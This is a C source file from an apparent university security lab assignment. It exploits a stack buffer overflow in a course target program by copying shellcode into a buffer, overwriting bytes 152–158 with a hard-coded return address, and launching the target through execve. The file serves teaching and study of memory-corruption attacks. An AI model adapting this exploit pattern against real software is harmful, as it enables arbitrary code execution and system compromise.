#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

// replace this define environment to have the correct path of your own target code
// note that you must have the target executable generated first (by using 'make' co$
#define TARGET "/home/net/ra295724/CAP6135/targets/target"

int main(void)
{
  char *args[3];
  char *env[2];
  char *tmp = NULL;

  // Creating an input buffer that can cause buffer overflow in strcpy function in t$
  int buffSize = 1000; char buff[buffSize]; 
  // Intialize buffer elements to 0x01
  int i;   
  for (i=0; i < buffSize; i++) 
        buff[i] = 0x01;

  // write your code below to fill the 27 bytes shellcode into the buff variable and
  // overwrite the return address correctly in order to achieve stack overflow
  // Your own code starts here:
  int a = 0;
  for(a=0;a<strlen(shellcode);a++){
          buff[a] = shellcode[a];
        }


  
  // Your code ends here.
  
  // prepare command line input to execute target code
//Given values start--
  args[0] = TARGET; 
  args[1] = buff; // the first input parameter to the target code

buff[152] = 0xe0;
buff[153] = 0xeb;
buff[154] = 0xff;
buff[155] = 0xff;
buff[156] = 0xff;
buff[157] = 0x7f;
buff[158] = '\0';

 
//Given values start
  args[2] = NULL;
  env[0] = "FOO=bar"; 
  env[1] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");
   return 0;
}





